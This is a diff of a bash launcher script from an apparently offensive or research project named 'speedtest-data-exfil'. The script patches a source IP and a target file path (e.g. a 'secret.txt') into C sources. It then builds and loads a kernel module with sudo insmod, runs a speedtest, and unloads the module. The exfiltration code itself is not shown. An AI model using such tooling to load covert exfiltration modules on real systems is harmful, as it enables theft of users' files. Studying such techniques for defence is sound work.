@@ -47,39 +47,39 @@ read -p "Enter 1 or 2: " choice
 
 if [ "$choice" == "1" ]; then
     # Modify constants in C file
-    sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" speedtest-data-exfil/max-exfil/speedtest-max-exfil.c
+    sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" ~/speedtest-data-exfil/max-exfil/speedtest-max-exfil.c
    
     # Build and load
     echo ""
     echo -e "${YELLOW}Building...${NC}"
-    make -C speedtest-data-exfil/max-exfil/speedtest-max-exfil.c
+    make -C ~/speedtest-data-exfil/max-exfil/speedtest-max-exfil.c
 
     echo -e "${YELLOW}Loading LKM...${NC}"
-    sudo insmod speedtest-data-exfil/max-exfil/speedtest-max-exfil.ko
+    sudo insmod ~/speedtest-data-exfil/max-exfil/speedtest-max-exfil.ko
 
     echo ""
     echo -e "${GREEN}Running speedtest...${NC}"
     speedtest
-    sudo rmmod speedtest-data-exfil/max-exfil/speedtest-max-exfil.ko && make clean
+    sudo rmmod ~/speedtest-data-exfil/max-exfil/speedtest-max-exfil.ko && make clean
 elif [ "$choice" == "2" ]; then
     # Modify constants in C file
-    sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" speedtest-data-exfil/test-exfil/speedtest-test-exfil.c
+    sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.c
 
     read -p "Enter TEST_FILE path (e.g. /home/user/secret.txt): " test_file
-    sed -i "s|#define TEST_FILE.*|#define TEST_FILE \"$test_file\"|" speedtest-data-exfil/test-exfil/speedtest-test-exfil.c
+    sed -i "s|#define TEST_FILE.*|#define TEST_FILE \"$test_file\"|" ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.c
     
     # Build and load
     echo ""
     echo -e "${YELLOW}Building...${NC}"
-    make -C speedtest-data-exfil/test-exfil/speedtest-test-exfil.c
+    make -C ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.c
 
     echo -e "${YELLOW}Loading LKM...${NC}"
-    sudo insmod speedtest-data-exfil/test-exfil/speedtest-test-exfil.ko
+    sudo insmod ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.ko
 
     echo ""
     echo -e "${GREEN}Running speedtest...${NC}"
     speedtest
-    sudo rmmod speedtest-data-exfil/test-exfil/speedtest-test-exfil.ko && make clean
+    sudo rmmod ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.ko && make clean
 else
     echo -e "${RED}Invalid choice. Exiting.${NC}"
     exit 1
